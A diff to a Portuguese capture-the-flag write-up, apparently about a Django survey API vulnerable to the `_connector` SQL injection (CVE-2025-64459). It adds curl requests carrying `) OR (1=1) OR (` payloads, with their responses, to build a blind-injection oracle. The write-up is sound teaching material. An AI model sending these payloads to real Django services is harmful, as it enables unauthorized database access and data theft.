@@ -41,7 +41,24 @@ Na minha instância o host era esse (o script usa a constante `TARGET`).
 
 ## Resolução
 
-### 1. Revisão do código: GET inteiro vira filtro
+### 1. Extração dos arquivos
+
+O `public.zip` (senha `infected`) traz o código Django. `unzip` não abre o AES, então `7z`:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+7z x -pinfected public.zip -oextracted -y && find extracted -name 'views.py' -o -name 'models.py'
+```
+
+```text
+extracted/.../surveys/views.py
+extracted/.../surveys/models.py
+```
+
+O `views.py` tem a view de busca (onde o bug entra) e o `models.py` define os models, incluindo um que a API não expõe. É por aí.
+
+### 2. Revisão do código: GET inteiro vira filtro
 
 #### `surveys/views.py`
 
@@ -71,16 +88,38 @@ O `**filters` é o problema: o usuário controla as chaves dos kwargs, não só 
 > [!TIP]
 > **Conceito: CVE-2025-64459 (`_connector` SQL injection no Django).** Ao construir um filtro, o Django usa `_connector` para decidir se junta as condições com `AND` ou `OR`. Em versões afetadas, um valor controlado de `_connector` passado para `QuerySet.filter(**kwargs)`/`Q(**kwargs)` é concatenado na SQL sem sanitização, permitindo injeção. A raiz do bug no desafio é mais básica ainda: nunca espalhar `request.GET` em `.filter(**...)`. Referência: [Django security release CVE-2025-64459](https://www.djangoproject.com/weblog/2025/).
 
-### 2. Confirmando o oráculo
+### 3. Confirmando o oráculo
 
 Montei o `_connector` como `) OR (<condição>) OR (` e dei a `author`/`title` valores impossíveis, então a query vira `WHERE (author='impossível') OR (<cond>) OR (title='impossível')`. Se `<cond>` for verdadeira, voltam surveys (`count > 0`); se falsa, `count = 0`. Baseline:
 
 - `_connector=) OR (1=1) OR (` -> `count > 0` (verdadeiro)
 - `_connector=) OR (1=0) OR (` -> `count = 0` (falso)
 
-Com True/False distinguíveis, tenho um oráculo booleano para blind SQLi.
+Dá pra ver o oráculo em requisições reais. O baseline (`/api/surveys` sem filtro) devolve 12 surveys; a condição verdadeira repete esse comportamento, a falsa zera:
 
-### 3. Extração cega da flag
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+curl -sk "https://$TARGET/api/surveys?author=zzz&_connector=)+OR+(1=1)+OR+(&title=zzz"
+```
+
+```text
+{"count": 12, "results": [{"id": 12, "title": "Plastic Waste Reduction Pilot Results", ...}]}
+```
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+curl -sk "https://$TARGET/api/surveys?author=zzz&_connector=)+OR+(1=0)+OR+(&title=zzz"
+```
+
+```text
+{"count": 0, "results": []}
+```
+
+`count: 12` para a condição verdadeira, `count: 0` para a falsa. Com True/False distinguíveis, tenho um oráculo booleano para blind SQLi.
+
+### 4. Extração cega da flag
 
 A flag está na tabela do model `AdminNote` (`surveys_adminnote`, coluna `value`), que a API não expõe. Extraio por prefixo com `LIKE '%flag{...%'`, testando um caractere por vez (charset hex, que é o formato das flags da Fluid). Script completo, idêntico ao arquivo em `scripts/`:
 
